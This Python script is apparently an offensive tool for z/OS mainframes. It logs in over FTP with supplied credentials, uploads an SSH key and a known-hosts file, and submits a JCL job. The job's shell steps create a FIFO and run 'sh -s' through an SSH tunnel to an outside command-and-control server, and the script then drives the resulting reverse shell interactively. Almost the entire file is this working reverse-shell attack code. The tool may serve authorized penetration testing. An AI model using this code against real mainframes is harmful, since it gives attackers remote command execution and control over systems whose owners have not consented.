#!/usr/bin/python
"""Gets a secure reverse shell on a mainframe by sending a JCL via FTP"""
import sys
import argparse
from string import Template
from configparser import ConfigParser, ExtendedInterpolation
import getpass
# This project imports
from sshutils import ssh_utils
from zosutils import ZOSFTP
from zosutils import Job
from wrappingshell import WrappingShell

MKFIFO = 'SH mkfifo $FIFONAME'
REVERSE_SH_SSH_TO_FILE = '''SH echo '
ssh -i $KEYNAME $CCU@$CCS -p $CCP
-o UserKnownHostsFile=$KNOWNHOSTSFILE
-o StrictHostKeyChecking=yes
-N
-W $NCIP:$NCP
< $FIFONAME |
sh -s > $FIFONAME 2>&1
& echo $STARTSEND 
> $FIFONAME
' > $TESTPATH
'''

REVERSE_SH_SSH = '''SH ssh -i $KEYNAME $CCU@$CCS -p $CCP
-o UserKnownHostsFile=$KNOWNHOSTSFILE
-o StrictHostKeyChecking=yes
-N
-W $NCIP:$NCP
< $FIFONAME |
sh -s > $FIFONAME 2>&1
& echo $STARTSEND 
> $FIFONAME
'''

def parse_configuration():
    """ Parse the commandline parameters and the configuration file """
    parser = argparse.ArgumentParser(
        description='Get a secure reverse shell via z/OS FTP')
    parser.add_argument('config_file', type=str,
                        help='configuration file to use')
    parser.add_argument('-t', '--test', help='run in test mode (do not run the shell)',
                        default=False, action='store_true')
    parser.add_argument('-p', '--privacy', help='hide the username on the password promt',
                        default=False, action='store_true')
    parser.add_argument('-s', '--savestate', type=str,
                        help='save the running configuration (including ssh keys) to this file',
                        default=None)
    args = parser.parse_args()
    # Config file parsing
    global_config = ConfigParser(interpolation=ExtendedInterpolation())
    global_config.read(args.config_file)
    config = global_config['ZOS']
    try:
        if config['password'] != '':
            print('WARNING: password in config file!')
            print('Consider using the interactive password request')
    except KeyError:
        if args.privacy:
            password_prompt = 'Input the password for ' + config['hostname'] + \
                              ': '
        else:
            password_prompt = 'Input the password for ' + config['username'] + \
                              ' on ' + config['hostname'] + ': '
        config['password'] = getpass.getpass(password_prompt)
    #TODO: add assert on the NEEDED config parameters
    return(global_config, args)

if __name__ == '__main__':
    # Config file from the command-line
    global_config, args = parse_configuration()
    config = global_config['ZOS']

    ssh = ssh_utils

    # SSH host fingerprint for the CC server
    autodetect_host_key = False
    try:
        cc_server_fingerprint = config['cc_server_fingerprint'].encode()
    except KeyError:
        cc_server_fingerprint = ssh.get_ecdsa_fingerprint(
            config['cc_server'],
            config['cc_port'])

    # Warn if the fingerprinting failed
    if cc_server_fingerprint == b'':
        print('ERROR: Empty CC server SSH fingerprint. Manually set one in the config file')
        sys.exit(1)

    # Load/generate SSH keys
    try:
        # Load key (k) and public key (p)
        key = config['key'].encode()
        authorized_key = config['authorized_key']
    except KeyError:
        # Generate key (k) and public key (p)
        key, pubkey = ssh.gen_rsa_key(config['keybits'])
        # Output the ssh known_host value
        authorized_key = ssh.rsa_to_openssh(pubkey).decode('utf-8')
        print(authorized_key)
        input('Save the above pulic key in ~/.ssh/authorized_keys for ' +
              config['cc_user'] + ' and press Enter to continue...')


    # Open FTP connection
    ftp = ZOSFTP(config['hostname'], config['username'], config['password'])
    ftp.connect()

    # Set the temporary filenames for the key, FIFO and known hosts
    # Technically vulnerable to a time of check vs time of use, but makes the
    # code easier to read
    ftpkeyname = ftp.gen_random_filename(path=config['temporary_path'])
    ftpfifoname = ftp.gen_random_filename(path=config['temporary_path'])
    ftpknownhosts = ftp.gen_random_filename(path=config['temporary_path'])

    # Save the key
    ftp.upload_string_as_file(key, ftpkeyname)

    # Save the known host file
    ftp.upload_string_as_file(cc_server_fingerprint, ftpknownhosts)

    # Create the FIFO for the shell
    mkfifo_step = Template(MKFIFO).substitute(FIFONAME=ftpfifoname)

    # Run the JCL to start the SSH tunnel
    if args.test:
        ssh_command = REVERSE_SH_SSH_TO_FILE
    else:
        ssh_command = REVERSE_SH_SSH
    ssh_step = Template(ssh_command).substitute(FIFONAME=ftpfifoname,
                                                KEYNAME=ftpkeyname,
                                                KNOWNHOSTSFILE=ftpknownhosts,
                                                CCU=config['cc_user'],
                                                CCS=config['cc_server'],
                                                CCP=config['cc_port'],
                                                NCIP=config['ebcdiccat_host'],
                                                NCP=config['ebcdiccat_port'],
                                                STARTSEND=WrappingShell.TERMINATOR_STRING,
                                                TESTPATH=config['temporary_path']+'/testfile.txt')
    JCL = Job('FTPJOB')
    JCL.add_inline(mkfifo_step)
    JCL.add_inline(ssh_step)
    ftp.run_jcl(JCL.render())

    # Prepare the reverse shell handling
    if args.test:
        print('Skipping the shell activation, test mode on')
    else:
        command = config['shell_command'].split(' ')
        shell = WrappingShell(command, config['codepage'],
                              name=config['hostname'], sync_stdout=True)
        shell.cmdloop()

    ftp.close()

    # Save the config?
    if args.savestate is not None:
        config['cc_server_fingerprint'] = cc_server_fingerprint.decode()
        config['key'] = key.decode()
        config['authorized_key'] = authorized_key
        config['ftpkeyname'] = ftpkeyname
        config['ftpfifoname'] = ftpfifoname
        config['ftpknownhosts'] = ftpknownhosts

        with open(args.savestate, 'w') as configfile:
            global_config.write(configfile)
